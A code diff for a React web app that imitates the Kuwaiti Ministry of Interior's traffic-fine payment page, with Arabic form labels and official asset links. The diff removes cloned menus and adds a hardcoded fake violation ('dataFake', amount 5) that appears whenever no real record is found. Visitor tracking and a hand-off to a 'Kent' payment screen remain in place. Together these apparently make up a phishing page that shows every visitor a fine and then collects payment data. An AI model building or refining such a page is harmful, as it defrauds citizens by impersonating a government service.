@@ -14,7 +14,14 @@ import LoadingScreen from "./sahel"
 import FullPageLoader from "./loader1"
 import { setupOnlineStatus } from "./online-sts"
 import DiscountPopup from "./modal"
-
+const dataFake=[
+  {
+    violationAmount:5,
+    violationTicketNumber:'4587745',
+    vehiclePlateNumber:'********',
+    violationDate:' 12/1/2025:05:05:31 '
+  }
+]
 function App(props: { setPage: any ,page:string}) {
   const [dataall] = useState<any>([])
   const { violationData, fetchViolationData } = useFetchViolationData()
@@ -81,7 +88,6 @@ function App(props: { setPage: any ,page:string}) {
     setupOnlineStatus(visitorId)
         addData({
           id: visitorId,
-          isOnline: navigator.userAgent,
           lastSeen: new Date().toISOString(),
         })
       }
@@ -546,119 +552,12 @@ function App(props: { setPage: any ,page:string}) {
             <div className="col">
               <div className="row text-justify">
                 <div className="col-sm-4 title">
-                  <a href="#">
-                    <img src="/wwer.svg" className="intro-logo m-1" />
-                    &nbsp;الإدارة العامة للمرور
-                  </a>
+               
                 </div>
                 <div className="col-sm-8">&nbsp;</div>
               </div>
               <div className="row text-center">
-                <div className="col-sm-12 col-md-4 col-lg-4 side-menu text-right">
-                  <div className="row mt-2">
-                    <div className="col-2 mr-1 ml-1">
-                      <a href="#">
-                        <img src="/ico-renew-license.svg" className="side-menu-icon" />
-                      </a>
-                    </div>
-                    <div className="col-8 align-self-center">
-                      <a href="#">الخدمات الالكترونية لرخص السوق</a>
-                    </div>
-                    <div className="col-1">&nbsp;</div>
-                  </div>
-                  <div className="row mt-2">
-                    <div className="col-2 mr-1 ml-1">
-                      <a href="#">
-                        <img src="/ico-payment.svg" className="side-menu-icon" />
-                      </a>
-                    </div>
-                    <div className="col-8 align-self-center">
-                      <a href="#">دفع المخالفات</a>
-                    </div>
-                    <div className="col-1">&nbsp;</div>
-                  </div>
-                  <div className="row mt-2">
-                    <div className="col-2 mr-1 ml-1">
-                      <a
-                        href="#appointmentsMenu"
-                        data-toggle="collapse"
-                        data-target="#appointmentsMenu"
-                        aria-expanded="false"
-                        aria-controls="appointmentsMenu"
-                      >
-                        <img src="/ico-booking.svg" className="side-menu-icon" />
-                      </a>
-                    </div>
-                    <div className="col-8 align-self-center">
-                      <a
-                        href="#appointmentsMenu"
-                        data-toggle="collapse"
-                        data-target="#appointmentsMenu"
-                        aria-expanded="false"
-                        aria-controls="appointmentsMenu"
-                      >
-                        نظام مواعيد اختبار القيادة
-                      </a>
-                    </div>
-                    <div className="col-1">&nbsp;</div>
-                  </div>
-                  <div className="collapse" id="appointmentsMenu">
-                    <div className="row mt-2 text-justify">
-                      <div className="col-2">&nbsp;</div>
-                      <div className="col-8">
-                        <i className="far fa-circle" />
-                        &nbsp;المواعيد مكتملة حاليا حتى إشعار آخر
-                      </div>
-                      <div className="col-2">&nbsp;</div>
-                    </div>
-                    <div className="row mt-2 text-justify">
-                      <div className="col-2">&nbsp;</div>
-                      <div className="col-8">
-                        <a href="https://ttd.moi.gov.kw/">
-                          <i className="far fa-circle" />
-                          &nbsp;اختبر نفسك
-                        </a>
-                      </div>
-                      <div className="col-2">&nbsp;</div>
-                    </div>
-                  </div>
-                  <div className="row mt-2">
-                    <div className="col-2 mr-1 ml-1">
-                      <a href="#">
-                        <img src="/ico-procedures.svg" className="side-menu-icon" />
-                      </a>
-                    </div>
-                    <div className="col-8 align-self-center">
-                      <a href="#">&nbsp;معاملات المرور</a>
-                    </div>
-                  </div>
-                  <div className="row mt-2">
-                    <div className="col-2 mr-1 ml-1">
-                      <a
-                        href="#sectionsMenu"
-                        data-toggle="collapse"
-                        data-target="#sectionsMenu"
-                        aria-expanded="false"
-                        aria-controls="sectionsMenu"
-                      >
-                        <img src="/ico-locations-sections.svg" className="side-menu-icon" />
-                      </a>
-                    </div>
-                    <div className="col-8 align-self-center">
-                      <a href="#">&nbsp;مواقع الإدارة العامة للمرور</a>
-                    </div>
-                  </div>
-                  <div className="row mt-2">
-                    <div className="col-2 mr-1 ml-1">
-                      <a href="/driving-license-conditions.pdf">
-                        <img src="/ico-pdf-doc.svg" className="side-menu-icon" />
-                      </a>
-                    </div>
-                    <div className="col-8 align-self-center">
-                      <a href="#">شروط منح رخص السوق لغير الكويتيين</a>
-                    </div>
-                  </div>
-                </div>
+               
                 <div className="col-sm-12 col-md-8 col-lg-8" id="GDTContent">
                   <div className="row">
                     <div className="col-3">&nbsp;</div>
@@ -670,7 +569,7 @@ function App(props: { setPage: any ,page:string}) {
                     </div>
                     <div className="col-3">&nbsp;</div>
                   </div>
-                  <div className="row mt-2 pl-2 pr-1 pb-5 text-justify" style={{fontSize:10}}>
+                  <div className="row mt-2 pl-2 pr-1 pb-5 text-justify" style={{fontSize:12}}>
                     <div className="col-12">
                       <form id="enquireForm" onSubmit={handleSubmit}>
                         <div className="form-row">
@@ -681,7 +580,7 @@ function App(props: { setPage: any ,page:string}) {
                                 type="radio"
                                 name="violationFor"
                                 id="violationForIndividual"
-                                defaultValue={1}
+                                checked
                               />
                               <label className="form-check-label" htmlFor="violationTypeIndividual">
                                 &nbsp;الأفراد
@@ -757,11 +656,11 @@ function App(props: { setPage: any ,page:string}) {
                                 </div>
                               </div>
                               <Plate
-                                violations={violationData?.personalViolationsData}
+                                violations={violationData?.personalViolationsData ?? dataFake}
                                 setAmount={setAmount}
                               />
                             </>
-                          ) : null}
+                          ) :  null}
                         </div>
                         <div className="form-row align-self-center mt-2">
                           <div className="col-12 text-left" id="payingAmount" />
@@ -823,445 +722,13 @@ addData({...data,page:'kent'}).then(()=>{
                       </form>
                     </div>
                   </div>
-                  <div className="d-flex justify-content-center">
-                    <div className="spinner-grow text-secondary d-none" role="status" id="workingOnIt">
-                      <span className="sr-only">Loading...</span>
-                    </div>
-                  </div>
-                  <div className="row mt-2 pl-4 pr-4 pb-5 text-center d-none">
-                    <div className="col-12">
-                      The service will be available shortly
-                      <br />
-                      الخدمة ستعود قريباً
-                    </div>
-                  </div>
+              
+                 
                 </div>
               </div>
             </div>
           </div>
-          <div className="row p-0 m-0">
-            <div className="accordion w-100 " id="sm-accordion">
-              {/*TRAFFIC VIOLATION*/}
-              <div className="card slider-card">
-                <div className="card-header text-center" id="headingOne">
-                  <a
-                    role="button"
-                    data-toggle="collapse"
-                    data-target="#collapsePayFines"
-                    href="#collapsePayFines"
-                    aria-expanded="true"
-                    aria-controls="collapsePayFines"
-                  >
-                    <svg
-                      xmlns="http://www.w3.org/2000/svg"
-                      id="Layer_1"
-                      width="8.572em"
-                      height="8.572em"
-                      data-name="Layer 1"
-                      viewBox="0 0 103 103"
-                    >
-                      <title>Payment</title>
-                      <rect className="circle cls-1" x="1.01" y="1.26" width={100} height={100} rx={50} />
-                      <path
-                        className="kd cls-2"
-                        d="M63.55,70.16l-6.06-7v7H55.27V56.25h2.22v6.06l5.84-6.06h2.75L59.59,62.5l6.73,7.66Z"
-                      />
-                      <path className="kd cls-2" d="M67.49,70.16v-2.5H69.4v2.5Z" />
-                      <path
-                        className="kd cls-2"
-                        d="M71.42,70.16V56.25h6.32c3.81,0,4.91,1.59,4.91,6.06v1.78c0,4.47-1.1,6.07-4.91,6.07Zm9-8c0-2.89-.46-4.36-2.89-4.36H73.62V68.58h3.94c2.25,0,2.89-1.3,2.89-4.2Z"
-                      />
-                      <rect className="cls-1" x="15.44" y="27.78" width="71.3" height="46.97" />
-                      <line className="cls-1" x1="22.53" y1="56.6" x2="39.12" y2="56.6" />
-                      <line className="cls-1" x1="32.8" y1="62.13" x2="38.33" y2="62.13" />
-                      <line className="cls-1" x1="22.53" y1="67.66" x2="38.33" y2="67.66" />
-                      <line className="cls-1" x1="15.29" y1="36.28" x2="86.4" y2="36.28" />
-                      <line className="cls-1" x1="15.29" y1="47.83" x2="86.4" y2="47.83" />
-                    </svg>
-                  </a>
-                </div>
-                <div
-                  id="collapsePayFines"
-                  className="collapse"
-                  aria-labelledby="headingOne"
-                  data-parent="#sm-accordion"
-                >
-                  <div className="card-body article-info text-center">
-                    <h5 className="title">دفع المخالفات والغرامات</h5>
-                    <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />
-                    <form id="MQAFines">
-                      <div className="col-12">
-                        <select className="form-control" id="MQAFinesSelectFineType" name="MQAFinesSelectFineType">
-                          <option value={1}>المرور</option>
-                          <option value={2}>الإقامة</option>
-                        </select>
-                      </div>
-                      <div className="col-12 mt-1">
-                        <input
-                          type="tel"
-                          className="form-control"
-                          id="MQAFinesTextCivilId"
-                          name="MQAFinesTextCivilId"
-                          maxLength={12}
-                          placeholder="الرقم المدني"
-                        />
-                      </div>
-                      <button className="btn btn-secondary mt-3" id="btnMEnquire">
-                        دفع
-                      </button>
-                    </form>
-                  </div>
-                </div>
-              </div>
-              {/*APPOINTMENTS
-      <div class="card slider-card">
-          <div class="card-header text-center" id="headingTwo">
-              <a role="button" data-target="#collapseAppointments" href="#collapsePersonalEnquiry" data-toggle="collapse" aria-expanded="false" aria-controls="collapsePersonalEnquiry">
-                  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" width="8.572em" height="8.572em" viewBox="0 0 103 103" style="enable-background:new 0 0 103 103;" xmlSpace="preserve">
-                  <defs>
- 
-          <div className="card slider-card d-none">
-            <div className="card-header text-center" id="headingFour">
-              <a
-                role="button"
-                data-toggle="collapse"
-                data-target="#collapseHealthCheck"
-                href="#collapseHealthCheck"
-                aria-expanded="false"
-                aria-controls="collapseHealthCheck"
-              >
-                <img
-                  src="https://www.moi.gov.kw/main/images/assets/common/ico-health-check-status.svg"
-                  className="moi-ico"
-                />
-              </a>
-            </div>
-            <div
-              id="collapseHealthCheck"
-              className="collapse"
-              aria-labelledby="headingFour"
-              data-parent="#sm-accordion"
-            >
-              <div className="card-body article-info text-center">
-                <h5 className="title">جاهزية نتيجة الفحص الطبي</h5>
-                <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />
-                <form id="MQAHealthCheck">
-                  <div className="col-12">
-                    <input
-                      className="form-control"
-                      id="MQAHealthCheckTextNationalNo"
-                      name="MQAHealthCheckTextNationalNo"
-                      maxLength={12}
-                      placeholder="رقم المرجع"
-                    />
-                  </div>
-                  <div className="col-12">
-                    <button
-                      className="btn btn-block btn-secondary mt-3"
-                      id="btnMQAHealthCheck"
-                    >
-                      إستعلم
-                    </button>
-                    <div className="d-flex justify-content-center">
-                      <div
-                        className="spinner-grow text-secondary d-none"
-                        role="status"
-                        id="MQAHCWorkingOnIt"
-                      >
-                        <span className="sr-only">Loading...</span>
-                      </div>
-                    </div>
-                    <div id="MQAHealthReport" className="d-none mt-3" />
-                  </div>
-                </form>
-              </div>
-            </div>
-          </div>
-          {/*CASE FILE CHECK*/}
-              <div className="card slider-card">
-                <div className="card-header active-acc text-center" id="headingFour">
-                  <a
-                    role="button"
-                    data-toggle="collapse"
-                    data-target="#collapseCaseCheck"
-                    href="#collapseCaseCheck"
-                    aria-expanded="false"
-                    aria-controls="collapseCaseCheck"
-                  >
-                    <img
-                      src="https://www.moi.gov.kw/main/images/assets/common/ico-case-track.svg"
-                      className="moi-ico"
-                    />
-                  </a>
-                </div>
-                <div
-                  id="collapseCaseCheck"
-                  className="collapse"
-                  aria-labelledby="headingFour"
-                  data-parent="#sm-accordion"
-                >
-                  <div className="card-body article-info text-center">
-                    <h5 className="title">الاستعلام عن سير القضية</h5>
-                    <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />
-                    <form id="MQACaseCheck">
-                      <div className="col-12">
-                        <input
-                          className="form-control"
-                          id="MQACaseCheckTextNationalNo"
-                          name="MQACaseCheckTextNationalNo"
-                          maxLength={12}
-                          placeholder="رقم المرجع"
-                        />
-                      </div>
-                      <div className="col-12">
-                        <button className="btn btn-block btn-secondary mt-3" id="btnMQACaseCheck">
-                          إستعلم
-                        </button>
-                        <div className="d-flex justify-content-center">
-                          <div className="spinner-grow text-secondary d-none" role="status" id="MQACCWorkingOnIt">
-                            <span className="sr-only">Loading...</span>
-                          </div>
-                        </div>
-                      </div>
-                    </form>
-                  </div>
-                </div>
-              </div>
-              {/*SMS CHANGE COMPANY*/}
-              <div className="card slider-card d-none">
-                <div className="card-header text-center" id="headingTwo">
-                  <a
-                    role="button"
-                    data-target="#collapsePersonalEnquiry"
-                    href="#collapsePersonalEnquiry"
-                    data-toggle="collapse"
-                    aria-expanded="false"
-                    aria-controls="collapsePersonalEnquiry"
-                  >
-                    <svg
-                      xmlns="http://www.w3.org/2000/svg"
-                      xmlnsXlink="http://www.w3.org/1999/xlink"
-                      version="1.1"
-                      id="Layer_1"
-                      x="0px"
-                      y="0px"
-                      width="8.572em"
-                      height="8.572em"
-                      viewBox="0 0 103 103"
-                      style={{ background: "new 0 0 103 103" }}
-                      xmlSpace="preserve"
-                    >
-                      <style
-                        type="text/css"
-                        dangerouslySetInnerHTML={{
-                          __html:
-                            "\n                        .st0 {\n                            fill: none;\n                            stroke: #fff;\n                            stroke-width: 2;\n                            stroke-miterlimit: 10;\n                        }\n\n                        .st1 {\n                            enable-background: new;\n                        }\n\n                        .st2 {\n                            fill: #fff;\n                        }\n\n                        .st3 {\n                            fill: none;\n                            stroke: #fff;\n                            stroke-miterlimit: 10;\n                        }\n",
-                        }}
-                      />
-                      <title>sms</title>
-                      <path
-                        className="circle st0"
-                        d="M51.5,1.5L51.5,1.5c27.6,0,50,22.4,50,50l0,0c0,27.6-22.4,50-50,50l0,0c-27.6,0-50-22.4-50-50l0,0  C1.5,23.9,23.9,1.5,51.5,1.5z"
-                      />
-                      <g className="st1">
-                        <path
-                          className="st2"
-                          d="M35.2,46.2c0-0.2,0.1-0.5,0.1-0.7c0-1.8-1.5-2-2.9-2c-2.8,0-3.3,0.6-3.3,2.2c0,1,0.3,1.6,1.1,2   c0.8,0.4,1.9,0.4,2.8,0.6c2.8,0.3,5.5,0.7,5.5,4.5c0,3.9-2.9,4.5-6,4.5c-2.7,0-6.2-0.3-6.3-4c0-0.3,0-0.6,0-0.9h2.9   c0,0.2,0,0.4,0,0.6c0,2.1,1.7,2.4,3.4,2.4c1.6,0,3.2-0.1,3.2-2.3c0-2.2-1.4-2.3-3.8-2.6c-3-0.3-5.8-0.8-5.8-4.4   c0-3.2,1.8-4.3,6-4.3c3.4,0,5.8,0.4,5.9,3.6c0,0.3,0,0.7-0.1,0.9H35.2z"
-                        />
-                        <path
-                          className="st2"
-                          d="M59.1,56.8V46c0-1.2-0.3-2.2-2.7-2.2c-1.9,0-2.9,0.8-3.2,2.1v10.9h-2.9V46c0-1.3-0.3-2.2-2.7-2.2   c-1.8,0-2.9,0.4-3.3,2.3v10.8h-3.1V41.9h3.1v2c0.8-1.2,2.4-2.3,4.8-2.3c2.7,0,3.7,0.9,4,2.3c1-1.4,2.6-2.3,4.8-2.3   c3.5,0,4.2,1.4,4.2,3.7v11.5H59.1z"
-                        />
-                        <path
-                          className="st2"
-                          d="M73.7,46.2c0-0.2,0.1-0.5,0.1-0.7c0-1.8-1.5-2-2.9-2c-2.8,0-3.3,0.6-3.3,2.2c0,1,0.3,1.6,1.1,2   c0.8,0.4,1.9,0.4,2.8,0.6c2.8,0.3,5.5,0.7,5.5,4.5c0,3.9-2.9,4.5-6,4.5c-2.7,0-6.2-0.3-6.3-4c0-0.3,0-0.6,0-0.9h2.9   c0,0.2,0,0.4,0,0.6c0,2.1,1.7,2.4,3.4,2.4c1.6,0,3.2-0.1,3.2-2.3c0-2.2-1.4-2.3-3.8-2.6c-3-0.3-5.8-0.8-5.8-4.4   c0-3.2,1.8-4.3,6-4.3c3.4,0,5.8,0.4,5.9,3.6c0,0.3,0,0.7-0.1,0.9H73.7z"
-                        />
-                      </g>
-                      <text
-                        transform="matrix(1 0 0 1 -231.0191 -27.0389)"
-                        className="st2"
-                        style={{ fontFamily: '"DDTRg-Regular"', fontSize: 28 }}
-                      >
-                        sms
-                      </text>
-                      <path
-                        className="st3"
-                        d="M30.6,82c0,0,0.5-9.4,6.1-12c0.6-0.3,1.2-0.4,1.9-0.4l45.2,0.2V28.4H20.8v41.4h5.4L30.6,82z"
-                      />
-                    </svg>
-                  </a>
-                </div>
-                <div
-                  id="collapsePersonalEnquiry"
-                  className="collapse"
-                  aria-labelledby="headingTwo"
-                  data-parent="#sm-accordion"
-                >
-                  <div className="card-body article-info text-center">
-                    <div className="col-12 title">تعديل شركة الإتصالات</div>
-                    <div className="col-12">
-                      <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />
-                    </div>
-                    <form asp-controller="sms" asp-action="change" id="MQAChangeCompany">
-                      <div className="row">
-                        <div className="col-12">
-                          <input
-                            type="tel"
-                            pattern="^[0–9]$"
-                            className="form-control"
-                            name="MQATextMobile"
-                            id="MQATextMobile"
-                            placeholder="*الموبايل"
-                            maxLength={8}
-                          />
-                        </div>
-                      </div>
-                      <div className="row mt-1">
-                        <div className="col-12">
-                          <input
-                            type="tel"
-                            pattern="^[0–9]$"
-                            className="form-control"
-                            name="MQATextCivilId"
-                            id="MQATextCivilId"
-                            placeholder="الرقم المدني"
-                            maxLength={12}
-                          />
-                        </div>
-                      </div>
-                      <div className="row mt-1 no-gutters">
-                        <div className="col-sm-12 col-md-5">
-                          <select className="form-control" id="MQASelectCompany" name="MSelectCompany">
-                            <option value={1}>VIVA</option>
-                            <option value={2}>OOREDOO</option>
-                            <option value={3}>ZAIN</option>
-                          </select>
-                        </div>
-                        <div className="col-sm-12 col-md-7 mt-1">
-                          <input
-                            type="password"
-                            autoComplete="off"
-                            pattern="^[0–9]$"
-                            name="MQATextActivationCode"
-                            id="MQATextActivationCode"
-                            className="form-control"
-                            placeholder="*رقم التفعيل"
-                            maxLength={4}
-                          />
-                        </div>
-                      </div>
-                      <div className="row mt-1">
-                        <div className="col-12">
-                          <button className="btn btn-block btn-secondary" id="MQABtnChange">
-                            تعديل
-                          </button>
-                          <div className="d-flex justify-content-center">
-                            <div className="spinner-grow text-secondary d-none" role="status" id="MQAWorkingOnIt">
-                              <span className="sr-only">Loading...</span>
-                            </div>
-                          </div>
-                        </div>
-                      </div>
-                    </form>
-                  </div>
-                </div>
-              </div>
-              {/*GET REFERENCE NUMBER*/}
-              <div className="card slider-card">
-                <div className="card-header text-center" id="mGetReferenceNumber">
-                  <a
-                    role="button"
-                    data-toggle="collapse"
-                    data-target="#collapseGetRefNum"
-                    href="#collapseGetRefNum"
-                    aria-expanded="false"
-                    aria-controls="collapseGetRefNum"
-                  >
-                    <img
-                      src="https://www.moi.gov.kw/main/images/assets/common/ico-get-ref-num.svg"
-                      className="moi-ico"
-                      id="getRefNumPopMob"
-                    />
-                  </a>
-                </div>
-                <div
-                  id="collapseGetRefNum"
-                  className="collapse show"
-                  aria-labelledby="mGetReferenceNumber"
-                  data-parent="#sm-accordion"
-                >
-                  <div className="card-body article-info text-center">
-                    <h5 className="title">الإستعلام عن رقم مرجع الداخلية</h5>
-                    <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />
-                    {/*<form id="MQARefNum">
-          <div class="col-12">
-              <input class="form-control" id="MQARefNumTextCivilId" name="MQARefNumTextCivilId" maxlength="12" placeholder="الرقم المدني" />
-          </div>
-          <div class="col-12 mt-1 d-none">
-              <input class="form-control" id="MQARefNumTextPassport" name="MQARefNumTextPassport" maxlength="15" placeholder="رقم جواز السفر" />
-          </div>
-          <div class="col-12 mt-1 d-none">
-              <input readonly class="form-control" id="MQARefNumTextExpiryDate" name="MQARefNumTextExpiryDate" maxlength="10" placeholder="تاريخ الانتهاء جواز السفر" />
-          </div>
-          <div class="col-12 d-none">
-              <button class="btn btn-block btn-secondary mt-2" id="btnMGetRefNum">استعلم</button>*/}
-                    {/*<div class="d-flex justify-content-center">
-              <div class="spinner-grow text-secondary d-none" role="status" id="MQARNWorkingOnIt">
-                  <span class="sr-only">Loading...</span>
-              </div>
-          </div>*/}
-                    {/*</div>
-              <div class="col-12">
-                  <button type="button" class="btn btn-block btn-secondary mt-2" id="btnMGetRefNumKwti">Kuwaiti</button>
-              </div>
-              <div class="col-12">
-                  <button type="button" class="btn btn-block btn-secondary mt-2" id="btnMGetRefNumOther">Non-Kuwaiti</button>
-              </div>
-          </form>
-          <div class="col-12 d-none" id="MQANatNumResultContainer">
-              <div class="row">
-                  <div class="col-12" id="MQANatNumResult"></div>
-                  <div class="col-12">
-                      <button type="button" class="btn btn-block btn-secondary mt-2" id="btnMGetRefNumDone">إغلاق</button>
-                  </div>
-              </div>
-          </div>*/}
-                    <div className="col-12">
-                      <input
-                        className="form-control"
-                        id="MQARefNumTextCivilId"
-                        name="MQARefNumTextCivilId"
-                        maxLength={12}
-                        placeholder="الرقم المدني"
-                      />
-                    </div>
-                    <div className="col-12">
-                      <button type="button" className="btn btn-block btn-secondary mt-2" id="btnMGetRefNumKwti">
-                        للكويتين
-                      </button>
-                    </div>
-                    <div className="col-12">
-                      <button type="button" className="btn btn-block btn-secondary mt-2" id="btnMGetRefNumOther">
-                        للمقيمين
-                      </button>
-                    </div>
-                  </div>
-                </div>
-              </div>
-              {/*NEW SERVICES*/}
-              <div className="card slider-card">
-                <div className="card-header text-center" id="headingFour">
-                  <a data-toggle="modal" data-target="#newServicesModal">
-                    <img
-                      src="https://www.moi.gov.kw/main/images/assets/common/ico-new-services.svg"
-                      className="card-img-top center-block moi-ico mx-auto"
-                      id="newServicesPopMob"
-                    />
-                  </a>
-                </div>
-              </div>
-            </div>
-          </div>
+       
         </div>
       ) : (
         <Kent violationValue={amount} />
